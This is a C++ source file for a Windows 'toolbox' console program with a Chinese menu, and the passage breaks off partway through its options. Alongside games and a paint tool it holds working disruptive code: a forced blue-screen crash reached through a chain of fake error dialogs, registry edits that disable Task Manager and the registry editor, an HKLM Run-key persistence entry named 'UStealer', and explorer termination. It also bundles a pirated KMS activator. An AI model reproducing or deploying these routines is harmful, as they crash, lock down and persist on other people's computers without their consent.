#include<stdio.h>
#include<stdlib.h>
#include<iostream>
#include<Windows.h>
#include <time.h>
#include <algorithm>
#include<direct.h>
#include <graphics.h>
#include <conio.h>
#include<string>
#include <stdint.h>				// uint64_t
#include<tchar.h>
#include <TlHelp32.h>
#include<vector>
#include <fstream>
#include <atlstr.h>
#include <chrono>
#include <thread>
#include "bolin.h"
#include"jindu.h"
#include"jiami.h"
#include"ziyuan.h"

TCHAR address_save_image[MAX_PATH];
static HWND hOut;
TCHAR address_load_image[MAX_PATH];		// 图像地址
//TCHAR address_load_watermark[MAX_PATH];	// 水印地址
IMAGE* img_temporary;			// 大图图像 512*512
#define HEIGHT		1	// 取平均值区域(像素)
#define WIDTH		1	// 取平均值区域(像素)  1的话就是一个像素一个字符,值越高照片越模糊,宽高最好要一样
#define CHAR_HEIGHT 13	// 输出的字符高(像素) 字符像素宽高为13
#define CHAR_WIDTH  13	// 输出的字符宽(像素) 修改小的话，字符会显示不完整

char transcoding(int ascii)// 转码函数
{
	if (ascii > 200)
		return ' ';
	if (ascii < 33)
		return ascii + 33;
	if (ascii > 126)
		return ascii % 126 + 33;
	return ascii;
}
#undef UNICODE
#undef _UNICODE
using namespace std;
#define hm 871*2
#define wm 869*2
#define hm1 hm/5
#define wm1 wm/5
#define PI        acos(-1.0)
#define SPEED     (PI/360)								// 针的旋转速度
#define NEEDLE_L  180									// 针的长度	
#define h 1200
#define w 1920

BOOL FindProcess(string strProc)
{
	int i = 0;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		cout << "???¨?????ì????±ú?§°?!" << endl;
		return false;
	}
	BOOL bMore = ::Process32First(hProcessSnap, &pe32);
	while (bMore)
	{
		//????????????stricmp????×?·?±???·??ò????????×??????ó???ò??????
		if (0 == _stricmp(strProc.c_str(), pe32.szExeFile))
		{
			i += 1;  //????    
		}
		bMore = ::Process32Next(hProcessSnap, &pe32);
	}
	if (i >= 1)
	{
		return true;
	}
	else
	{
		return false;
	}
}
void HpSleep(int ms);									// 精确延时
void drawframe(int number);
void Move(int number, int x, int y);
void Rotate(double* R, int num);
bool Pin(double* R, int num);
void eraser(int x, int y);
class seat
{
public:
	int i = 0;      // y 坐标
	int j = 0;      // x 坐标
	int number = 0; // 分数
};

// 保存棋盘的类
class box
{
public:
	void draw();            // 绘制
public:
	int x = 0;              // x 坐标
	int y = 0;              // y 坐标
	int value = -1;         // 值（黑棋：1，白棋：0，空位：-1）
	int modle = 0;          // 模式
	bool isnew = false;     // 是否有选择框
	COLORREF color = WHITE; // 棋盘背景色
};


// 函数声明
void draw();                  // 绘制
void init();                  // 初始化
seat findbestseat(int color, int c); // 寻找最佳位置
void isWIN();                 // 判断输赢
void game();     


struct Point
{
	int x;
	int y;

	Point() { x = -1; y = -1; }

	Point(int x, int y)
	{
		this->x = x;
		this->y = y;
	}

	bool operator==(const Point& p)
	{
		return x == p.x && y == p.y;
	}

	Point& operator=(const Point& p)
	{
		x = p.x; y = p.y;
		return *this;
	}
};

// 所有控件的父类
struct Tool
{
	int left;
	int top;
	int width;
	int height;

	Tool() {}

	Tool(int left, int top, int width, int height)
	{
		this->left = left;
		this->top = top;
		this->width = width;
		this->height = height;
	}

	virtual double call(MOUSEMSG) = 0;

	bool isIn(const Point& p)
	{
		if (p.x >= left && p.x <= left + width && p.y >= top && p.y <= top + height)
		{
			return true;
		}
		return false;
	}
};

// 作为矩形用
struct Tool_Range :Tool
{
	Tool_Range() {}

	Tool_Range(int left, int top, int width, int height) :Tool(left, top, width, height) {}

	double call(MOUSEMSG m)
	{
		return 0;
	}
};


// 可画画的区域
struct Tablet :Tool
{
	int size;
	COLORREF color;

	Tablet() {}

	Tablet(int left, int top, int width, int height, int size, COLORREF color) :Tool(left, top, width, height)
	{
		this->size = size;
		this->color = color;
		isDown = false;
	}

	double call(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isDown = true;
				begPos = Point(m.x, m.y);
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			isDown = false;
		}

		if (m.uMsg == WM_MOUSEMOVE && isDown)
		{
			if (isIn(begPos) && isIn(Point(m.x, m.y)))		// 在区域内
			{
				setlinestyle(PS_ENDCAP_ROUND, size);
				setlinecolor(color);
				HRGN rgn = CreateRectRgn(left, top, left + width, top + height);
				setcliprgn(rgn);
				DeleteObject(rgn);
				line(begPos.x, begPos.y, m.x, m.y);
				setcliprgn(NULL);
			}
			begPos = Point(m.x, m.y);
		}

		return 1;
	}

private:
	bool isDown;
	Point begPos;
};

// 简单标签
struct Label :Tool
{
	wstring s;
	COLORREF color;
	bool isCenteral;

	Label() {}

	Label(int left, int top, int width, int height, wstring s, COLORREF color, bool isCenteral = false) :Tool(left, top, width, height)
	{
		this->color = color;
		this->s = s;
	}

	double call(MOUSEMSG m)
	{
		setfillcolor(0xefefef);
		solidrectangle(left, top, left + width, top + height);
		settextcolor(color);
		setbkmode(TRANSPARENT);
		settextstyle(24, 15, "Courier");
		RECT rect = { left, top, left + width, top + height };
		return 1;
	}

	bool isClick(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONUP)
		{
			if (isIn(Point(m.x, m.y)))
			{
				return true;
			}
		}
		return false;
	}
};

// 圆形按钮
struct Circle :Tool
{
	COLORREF color;
	COLORREF color_over;
	bool isClick;

	Circle()
	{
		isClick = false;
	}

	Circle(int left, int top, int width, int height, COLORREF color, COLORREF color_over) :Tool(left, top, width, height)
	{
		this->color = color;
		this->color_over = color_over;
		isClick = false;
	}

	double call(MOUSEMSG m) { return 1; }

	bool call(MOUSEMSG m, Tablet& tab)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isClick = true;
				tab.color = color;
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isClick = true;
			}
		}

		if (m.uMsg == WM_MOUSEMOVE)
		{
			if (isIn(Point(m.x, m.y)))
			{
				isOver = true;
			}
			else
			{
				isOver = false;
			}
		}

		setfillcolor(color);	// always have a color
		if (isOver) setfillcolor(color_over);
		setlinecolor(0xffffff);
		if (isClick)
		{
			setlinestyle(PS_ENDCAP_ROUND, 3);
		}
		else
		{
			setlinestyle(PS_ENDCAP_ROUND, 0);
		}
		fillellipse(left, top, left + width, top + height);
		return isClick;
	}

private:
	bool isOver;
};

//滑动条
struct Slider :Tool
{
	double percent;
	int radius;
	COLORREF bkcolor;
	COLORREF fkcolor;

	Slider() { }

	Slider(int left, int top, int width, int height, double percent = 0, int radius = 0, COLORREF bkcolor = 0x000000, COLORREF fkcolor = 0xffffff) :Tool(left, top, width, height)
	{
		this->percent = percent;
		this->radius = radius;
		this->bkcolor = bkcolor;
		this->fkcolor = fkcolor;
		setRange();
	}

	double call(MOUSEMSG m)
	{
		if (m.uMsg == WM_LBUTTONDOWN)
		{
			if (m.x >= left - radius && m.x <= left + width + radius && m.y >= top && m.y <= top + height)
			{
				isDrag = true;
				deltaY = range.top - m.y;
			}
		}

		if (m.uMsg == WM_LBUTTONUP)
		{
			isDrag = false;
		}

		if (m.uMsg == WM_MOUSEMOVE && isDrag)
		{
			int t = deltaY + m.y;
			if (t < top)
			{
				percent = 0;
			}
			else if (t > top + height - radius)
			{
				percent = 1;
			}
			else
			{
				percent = (t - top) / (double)(height - radius);
			}
		}

		setRange();
		setfillcolor(0xefefef);
		solidrectangle(left - radius, top - (radius / 2 + 2), left + width + radius, top + height + (radius / 2 + 2));
		setfillcolor(bkcolor);
		solidroundrect(left, top, left + width, top + height, 3, 3);
		setfillcolor(fkcolor);
		solidellipse(range.left, range.top, range.left + radius, range.top + radius);
		return percent;
	}

private:
	bool isDrag = false;
	int deltaY = 0;
	Tool_Range range;

	void setRange()
	{
		double t = radius / 2.0;
		double y = height - radius;
		y *= percent;
		y = top + t + y;
		double x = left + width / 2.0;
		range.left = (int)(x - t);
		range.top = (int)(y - t);
		range.width = radius;
		range.height = radius;
	}
};








































char* aaa() {//获取可执行文件路径

	char szBuf[512] = { 0 };
	getcwd(szBuf, sizeof(szBuf) - 1);
	printf("buf:%s\n", szBuf);


	char szPath[512] = { 0 };
	GetModuleFileName(NULL, szPath, sizeof(szPath) - 1);
	printf("path:%s\n", szPath);
	return szPath;
}
void HKRunator(char* programName)   //程序名称（**全路径**）
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueEx(hkey,
			"UStealer",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}
//鼠标抖动
void MOUSE() {
	int x = 0, y = 0, a = 0;
	int n = 4;
	POINT p;
	srand((unsigned)time(NULL));
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	GetCursorPos(&p);
	x = rand() % n;
	y = rand() % n;
	a = rand() % n;
	if (a == 1)
	{
		SetCursorPos(p.x + x, p.y + y);
		//SetCursorPos(p.x-x,p.y+y);//增加稳定
	}
	else if (a == 0)
	{
		SetCursorPos(p.x - x, p.y - y);
		//SetCursorPos(p.x+x,p.y-y);//增加稳定
	}
	Sleep(0);
}
//图标
void ICON() {
	int n = 70, n1 = 1920, n2 = 1200, x1, y1;
	int i = 0;
	HWND hwnd = GetDesktopWindow();
	HINSTANCE hshell32 = LoadLibrary(_T("shell32.dll"));
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	srand((unsigned)time(NULL));
	POINT p;
	srand((unsigned)time(NULL));
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	for (int i = 0; i < 10; i++) {

		x1 = rand() % n1;
		y1 = rand() % n2;
		GetCursorPos(&point);
		i = rand() % 256;
		DrawIcon(hdc, x1, y1, LoadIcon(hshell32, MAKEINTRESOURCE(i)));
	}
}
//蓝屏
void lanping() {
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC ZwRaiseHardError = GetProcAddress(ntdll, "ZwRaiseHardError");
	unsigned char ErrorKill;
	long unsigned int HardError;
	((void(*)(DWORD, DWORD, bool, LPBYTE))RtlAdjustPrivilege)(0x13, true, false, &ErrorKill);
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardError)(0xc0114514, 0, 0, 0, 6, &HardError);
}
// 禁用系统任务管理器
void RegTaskmanagerForbidden(bool a)
{
	HKEY hkey;
	DWORD value = a;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// 禁用注册表编辑器
void RegEditForbidden(bool a)
{
	HKEY hkey;
	DWORD value = a;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
	RegCloseKey(hkey);
}

// 干掉桌面壁纸
void RegModifyBackroud(bool a)
{
	DWORD value = a;
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char*)"c://", 3);
	RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));

}

string open1;

void open(){
	int x, y;
	// 打开文件对话框
	OPENFILENAME ofn;
	// 保存文件完整路径
	TCHAR szFileName[MAX_PATH] = { 0 };
	// 设置过滤条件
	TCHAR szFilter[] = TEXT("图像 (*.png,*.jpg,*.bmp)\0*.png;*.jpg\0") \
		TEXT("所有文件 (*.*)\0*.*\0\0");
	ZeroMemory(&ofn, sizeof(ofn));
	// 保存文件完整路径
	ofn.lpstrFile = szFileName;
	ofn.nMaxFile = MAX_PATH;
	// 保存文件名
	ofn.lpstrFileTitle = address_load_image;
	ofn.nMaxFileTitle = MAX_PATH;
	ofn.lpstrFilter = szFilter;
	// 默认扩展名
	ofn.lpstrDefExt = _T("png");
	ofn.lpstrTitle = NULL;
	ofn.Flags = OFN_HIDEREADONLY | OFN_PATHMUSTEXIST;
	ofn.lStructSize = sizeof(OPENFILENAME);
	// 拥有该对话框的窗口句柄
	ofn.hwndOwner = hOut;
	GetOpenFileName(&ofn);
	// 重置，初始化
//	img_temporary = new IMAGE(x, y);
	//img_watermark = new IMAGE(64, 64);
	// 加载
//	loadimage(img_temporary, address_load_image, x, y);
	open1 = address_load_image;
}
HWND hwnd = GetForegroundWindow();
// 游戏主函数
int main(int ab, char* b[])
{
	system("md resource");
	system("md Minecraft");
	system("md music");
	system("cls");
//	cout << ab;
	if(ab>1) {
		for (int i = 1; i <= ab; i++) {
			jiami(i, b, 0);
		}
		return 0;
	}
	cout << "加载资源中...";
	cout.flush();
	hideCursor(0);

	ziyuan("MP3", IDR_MP31, "w.MP3", "music\\", 1,0,60,100);

	std::cout << std::endl;
	cout << "完成\n";
	cout.flush();
	system("cls");
	cout << "欢迎使用简单工具玩具箱\n";
	cout << "作者：郭骏毅\n";
	cout << "版本：2.0\n";
	cout << "功能：\n";
	hideCursor(1);
	//system("cls");
	while (1) {
		int a;
		string s;
		system("title 简单工具玩具箱");
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout  << "加密(把要加密的文件用该程序打开，再打开一次还原)\n";
		cout << 2 << "、输入cmd命令\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 3 << "、60秒后关机\n";
		cout << 4 << "、取消关机\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_BLUE);
		cout << 5 << "、关于Windows\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_BLUE);
		cout << 6 << "、打开画图\n";
		cout << 7 << "、打开cmd\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 8 << "、关机\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 9 << "、五子棋\n";
		cout << 10 << "、画板\n";
		cout << 11 << "、套娃文件夹\n";
		cout << 12 << "、见缝插针\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 13 << "、结束explorer\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout << 14 << "、打开explorer\n";
		cout << 15 << "、打开PlainCraftLauncher2\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 16 << "、结束PlainCraftLauncher2\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 17 << "、截屏\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);
		cout << 18 << "、60秒后重启\n";
		cout << 19 << "、休眠(完全断电，但是会保存当前电脑的状态)\n";
		cout << 20 << "、整蛊\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_BLUE);
		cout << 21 << "、打开geek\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout << 22 << "、删除D:\\del\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 23 << "、摩尔纹\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
		cout << 24 << "、激活Windows\n";
		cout << 25 << "、下载Devc++\n";
		cout << 26 << "、图片转化为 ASCII 图(替换)\n";
		cout << 27 << "、下载bandizip\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY |FOREGROUND_GREEN | FOREGROUND_BLUE);
		cout << 28 << "、磁盘修复\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
		cout << 29 << "、结束任务\n";
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
		cout << 30 << "、遍历所有窗口\n";
		cout << 31 << "、朗读文本\n";
		cout << 32 << "、禁用任务管理器\n";
		cout << 33 << "、开机运行\n";
		cout << 34 << "、取消开机运行\n";
		cout << 35 << "、病毒\n";
		cout << 36 << "、解除病毒\n";
		cout << 37 << "、屏幕隧道\n";
		cout << 38 << "、电脑屏幕扭曲下垂\n";
		cout << 39 << "、exe、dll ICON抽取\n";
		cout << 40 << "、特效病毒\n";
		cout << 41 << "、改密码\n";
		cout << 42 <<"、柏林噪声\n";


		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

		cin >> a;
		if ((a > 0 && a < 200)) {

		}
		else {
			cout << "不能是字符";
			system("start 简单工具玩具箱.exe");
			system("pause>null");

			exit(EXIT_SUCCESS);
			system("start 简单工具玩具箱.exe");
		}

		if (a == 1) {
			string a = "echo curl https://sw.pcmgr.qq.com/36666aaecae92ec837809aa55a63af40/66486128/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o name.exe > ", b,c;
			cin >> b;
			c = a + b;
			//cout << c;
//			system("echo  curl https://sw.pcmgr.qq.com/36666aaecae92ec837809aa55a63af40/66486128/spcmgr/download/Dev-Cpp_5.11_TDM-GCC_4.9.2_Setup.exe -o name.exe >D:\\简单工具玩具箱.bat ");//在郭骏毅最帅>D:\我的文档\Desktop\果果\新建文件夹\system.txt创建system.txt并写入郭骏毅最帅 

			system(c.c_str());//打开简单工具玩具箱.bat
			system("pause");
		}
		else if (a == 2) {
			cin >> s;
			system(s.c_str());
			//system("pause");
			system("start 简单工具玩具箱.exe");
			exit(EXIT_SUCCESS);//关闭窗口
			system("start 简单工具玩具箱.exe");

		}
		else if (a == 3) {
			system("shutdown -s -t 60");
			system("start 简单工具玩具箱.exe");
			for (int i = 1; i <= 60; i++) {
				system("cls");
				cout << i << "%60";
				Sleep(1000);

			}
		}
		else if (a == 4) {

			system("shutdown -a");

		}
		else if (a == 5) {
			string winver = "winver";
			system(winver.c_str());
		}
		else if (a == 6) {
			string mspaint = "mspaint";
			system(mspaint.c_str());
		}
		else if (a == 7) {
			string cmd = "cmd";
			system("cls");
			system("start 简单工具玩具箱.exe");
			system(cmd.c_str());
		}
		else if (a == 8) {
			system("pause>null");
			system("shutdown -p");
		}
		else if (a == 9) {
			initgraph(700, 700); // 初始化绘图环境
			setbkcolor(WHITE);
			cleardevice();
			setbkmode(TRANSPARENT); // 设置透明文字输出背景
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			
			while (1)
			{
				init(); // 初始化
				game(); // 游戏开始
				cleardevice();
			}
		}
		else if (a == 10) {
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			const Point defaultWH(1100, 768);										// 默认宽高
			initgraph(defaultWH.x, defaultWH.y);									// 初始化
			BeginBatchDraw();
			setfillcolor(0xffffff);
			fillrectangle(0, 0, defaultWH.x, defaultWH.y);							// 默认画图板背景
			setfillcolor(0xefefef);
			fillrectangle(defaultWH.x - 100, 0, defaultWH.x, defaultWH.y);			// 默认工具栏背景

			// 定义控件及其样式
			Tablet mainTablet(0, 0, defaultWH.x - 100, defaultWH.y, 5, 0x000000);
			Label label1(defaultWH.x - 100 + 27, 15, 48, 24, L"工具", 0x666666);
			Label label2(defaultWH.x - 100 + 22, 740, 60, 20, L"1", 0x666666, true);
			Slider slider1(defaultWH.x - 100 + 48, 600, 5, 120, 0, 26, 0xc3c3c3, 0x666666);
			Circle Circles[9];
			for (int i = 0; i < 9; i++)
			{
				Circles[i].left = defaultWH.x - 100 + 26;
				Circles[i].top = 50 + i * 60;
				Circles[i].width = 50;
				Circles[i].height = 50;
			}
			Circles[0].color = 0x000000;	Circles[0].color_over = 0x2e2e2e;	Circles[0].isClick = true;
			Circles[1].color = 0xffffff;	Circles[1].color_over = 0xfafafa;
			Circles[2].color = 0x1f1ae6;	Circles[2].color_over = 0x332fe6;
			Circles[3].color = 0x7018ed;	Circles[3].color_over = 0x863eed;
			Circles[4].color = 0xed3eeb;	Circles[4].color_over = 0xed76ec;
			Circles[5].color = 0xad2f09;	Circles[5].color_over = 0xad5c43;
			Circles[6].color = 0xcfd12f;	Circles[6].color_over = 0xd0d15d;
			Circles[7].color = 0x11f41c;	Circles[7].color_over = 0x4ef456;
			Circles[8].color = 0x0c98d2;	Circles[8].color_over = 0x4dabd2;

			while (true)
			{
				while (MouseHit())
				{
					MOUSEMSG m = GetMouseMsg();

					//控件之间的交互关系
					mainTablet.call(m);
					double percent = slider1.call(m);
					int progress = (int)(1 + percent * percent * 299);
					mainTablet.size = progress;
					wchar_t protext[4];
					_itow_s(progress, protext, 10);
					label2.s = protext;
					int whichCircle = -1, whichCircleChoosed = -1;
					for (int i = 0; i < 9; i++)									// find last
					{
						if (Circles[i].isClick) whichCircleChoosed = i;
					}
					for (int i = 0; i < 9; i++)									// find last + new
					{
						if (Circles[i].call(m, mainTablet) && whichCircleChoosed != i)
							whichCircle = i;
					}
					if (whichCircle != -1)
					{
						Circles[whichCircle].isClick = true;
						Circles[whichCircleChoosed].isClick = false;
					}
					if (label1.isClick(m))
					{
						saveimage("作品.bmp");
					}

				}
				label1.call(MOUSEMSG());
				label2.call(MOUSEMSG());
				FlushBatchDraw();
				Sleep(50);
			}

			system("pause");
			EndBatchDraw();
			closegraph();

		}
		else if (a == 11) {
			string abcdd="for /L %i in (1,1,999) do MD %i && CD %i && echo %i";
			system(abcdd.c_str());
			system("pause");
			}
		else if (a == 12) {
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			initgraph(480, 640);
			while (true)
			{
				setbkcolor(RGB(189, 188, 187));
				cleardevice();
				drawframe(1);
				double radian[25] = { 0 };						// 储存针的弧度
				int Needle_N = 0;								// 针的个数				
				MOUSEMSG msg;
				bool IS = false;
				while (true)
				{
					Move(Needle_N, 240, 560);					// 绘制针的位置
					Move(Needle_N + 1, 240, 600);
					Move(Needle_N + 2, 240, 640);
					Rotate(radian, Needle_N);
					while (MouseHit())							// 当有鼠标消息的时候执行
					{
						msg = GetMouseMsg();					// 获取鼠标消息
						switch (msg.uMsg)						// 根据不同的鼠标消息，执行不同的代码
						{
						case WM_LBUTTONDOWN:
							if (Pin(radian, Needle_N))
							{
								Needle_N++;
							}
							else
							{
								IS = true;
							}break;
						}
					}
					if (IS)
					{
						break;
					}
					HpSleep(10);								// 延时，降低 CPU 占用率
				}
				HWND wnd = GetHWnd();
				if (MessageBox(wnd, _T("游戏结束。\n重来一局吗？"), _T("询问"), MB_YESNO | MB_ICONQUESTION) == IDYES)
					continue;
				else
					break;
			}
			return 0;
		}
		else if (a == 13) {
			string explorer = "TASKKILL /F /IM explorer.exe";
			system(explorer.c_str());
		}
		else if (a == 14) {
			string explorer2 = "start explorer.exe";
			system(explorer2.c_str());
		}
		else if (a == 15) {
			ziyuan("EXE", IDR_EXE5, "PlainCraftLauncher2.exe", "Minecraft\\", 0,0,100,10);
		}
		else if (a == 16) {
			string explorer = "TASKKILL /F /IM PlainCraftLauncher2.exe";
			system(explorer.c_str());
		}
		else if (a == 17) {
			int abcd;
			cout << "你要在几秒后截图？\n";
			cin >> abcd;
			cout << abcd << "秒后截图\n";
			ShowWindow(hwnd, SW_MINIMIZE);
			Sleep(abcd * 1000);

			// 获取桌面 DC
			HDC srcDC = GetDC(NULL);
			// 创建目标 IMAGE 对象
			IMAGE img(w, h);
			// 获取 IMAGE 对象的 DC
			HDC dstDC = GetImageHDC(&img);
			// 在两个 DC 之间执行图像拷贝，将桌面抓图拷贝到 IMAGE 对象里面
			BitBlt(dstDC, 0, 0, w, h, srcDC, 0, 0, SRCCOPY);

			// 创建绘图窗口
			initgraph(w, h);
			// 在窗口中显示 IMAGE 中保存的桌面图像
			putimage(0, 0, &img);
			saveimage(_T("截图.bmp"));
			// 按任意键退出
			cout << "该页面已无效!";
			system("title 该页面已无效!");
			system("start 简单工具玩具箱.exe");
			getmessage(EX_CHAR);

			closegraph();
		}
		else if (a==18) {
			system("shutdown  -r -t 60");
			system("start 简单工具玩具箱.exe");
			for (int i = 1; i <= 60; i++) {
				system("cls");
				cout << i << "%60";
				Sleep(1000);
			}
		}else if (a == 19) {
			system("shutdown -h");
		}
		else if (a == 20) {
			ShowWindow(hwnd, SW_MINIMIZE);
			if (MessageBox(NULL, "有些错误,你要解决吗?", "提示", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
				if (MessageBox(NULL, "正在解决……", "解决", MB_OKCANCEL | MB_ICONASTERISK) == IDOK) {
					if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
						if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
							if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
								if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
									if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
										if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
											if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
												if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
													if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
														if (MessageBox(NULL, "解决失败", "解决失败", MB_OK | MB_ICONHAND) == IDOK) {
															if (MessageBox(NULL, "哈哈哈", "逗你的", MB_OK | MB_ICONEXCLAMATION) == IDOK) {
																if (MessageBox(NULL, "即将蓝屏，打开任务管理还可挽回", "警告", MB_OK | MB_ICONQUESTION) == IDOK) {
																	if (MessageBox(NULL, "无法挽回", "马上蓝屏", MB_OK | MB_ICONHAND) == IDOK) {
																		ShowWindow(GetForegroundWindow(), SW_HIDE);
																		HMODULE ntdll = LoadLibrary("ntdll.dll");
																		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
																		FARPROC ZwRaiseHardError = GetProcAddress(ntdll, "ZwRaiseHardError");
																		unsigned char ErrorKill;
																		long unsigned int HardError;
																		((void(*)(DWORD, DWORD, bool, LPBYTE))RtlAdjustPrivilege)(0x13, true, false, &ErrorKill);
																		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardError)(0xc0114514, 0, 0, 0, 6, &HardError);
																		return 0;
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
					return 0;
				}
			}
		}
		else if (a == 21) {
			ziyuan("EXE", IDR_EXE1, "geek.exe", "resource\\", 1,0,10,10);
		}
		else if (a == 22) {
			system("del /Q /F /S D:\\del");
			}
		else if (a == 23) {
				cout << "该页面已无效!";
				system("title 该页面已无效!");
				system("start 简单工具玩具箱.exe");
				initgraph(wm, hm);
				IMAGE bk;


				for (int i = 0; i < wm; i = i + wm1) {
					for (int j = 0; j < h; j = j + hm1) {
						loadimage(&bk, _T("PNG"), IDB_PNG1/*_T("Background")*/, wm1, hm1);

						putimage(/*x*/i, /*y*/j, &bk);
					}
				}

				while (true)
				{

				}
				//system("pause");
				return 0;

		}
		else if (a==24) {
			ziyuan("EXE", IDR_EXE2, "HEU_KMS_Activator_v42.0.3.exe", "resource\\", 1,0,10,10);
		}
		else if (a == 25) {
